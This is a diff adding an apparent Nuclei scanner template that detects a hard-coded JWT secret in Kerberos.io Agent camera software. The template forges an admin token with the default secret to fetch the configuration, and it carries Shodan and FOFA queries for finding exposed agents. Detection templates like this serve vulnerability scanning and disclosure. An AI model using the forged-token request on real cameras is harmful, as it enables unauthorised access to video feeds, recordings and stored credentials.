@@ -1,0 +1,62 @@
+id: kerberos-agent-default-jwt
+
+info:
+  name: Kerberos.io Agent - Default JWT Secret
+  author: s4e-io
+  severity: high
+  description: |
+    Kerberos.io Agent signs its session JWTs with the hard-coded HMAC secret TOBECHANGED. Releases before 3.6.28 offer no way to change it, and later releases only replace it when the undocumented AGENT_JWT_SECRET environment variable is set. An unauthenticated attacker can forge an admin token without knowing any username or password, even when AGENT_USERNAME and AGENT_PASSWORD were changed, and then read the configuration with camera RTSP/ONVIF credentials and storage keys, watch the live stream, download recordings, and change or stop the agent.
+  remediation: |
+    Set AGENT_JWT_SECRET to a long random value, change the default credentials, and do not expose the agent web interface to untrusted networks.
+  reference:
+    - https://github.com/kerberos-io/agent/blob/v3.14.3/machinery/src/routers/http/jwt_middleware.go
+    - https://github.com/kerberos-io/agent/commit/4d163c4b53965fa4e1242f6fcc0ca547f7737191
+    - https://github.com/kerberos-io/agent/blob/v3.14.3/machinery/src/routers/http/routes.go
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:L
+    cvss-score: 8.3
+    cwe-id: CWE-798
+  metadata:
+    verified: true
+    vendor: kerberos-io
+    product: agent
+    shodan-query: http.title:"Kerberos Agent"
+    fofa-query: title="Kerberos Agent"
+  tags: kerberos-agent,kerberos-io,iot,camera,jwt,default-jwt,auth-bypass,misconfig,vuln
+
+variables:
+  default_secret: "TOBECHANGED"
+  control_secret: "{{randstr}}"
+  claims: '{"id":{"username":"root","role":"admin"},"exp":{{unix_time(3600)}},"orig_iat":{{unix_time()}}}'
+
+flow: http(1) && http(2)
+
+http:
+  - raw:
+      - |
+        GET /api/config HTTP/1.1
+        Host: {{Hostname}}
+        Authorization: Bearer {{generate_jwt(claims,"HS256",control_secret)}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 401'
+          - 'contains(to_lower(header), "jwt realm=kerberosio")'
+          - 'contains(body, "\"code\":401")'
+        condition: and
+        internal: true
+
+  - raw:
+      - |
+        GET /api/config HTTP/1.1
+        Host: {{Hostname}}
+        Authorization: Bearer {{generate_jwt(claims,"HS256",default_secret)}}
+
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 200'
+          - 'contains(content_type, "application/json")'
+          - 'contains_all(body, "\"config\":{", "\"capture\":{", "\"ipcamera\":{", "\"remove_after_upload\":")'
+        condition: and
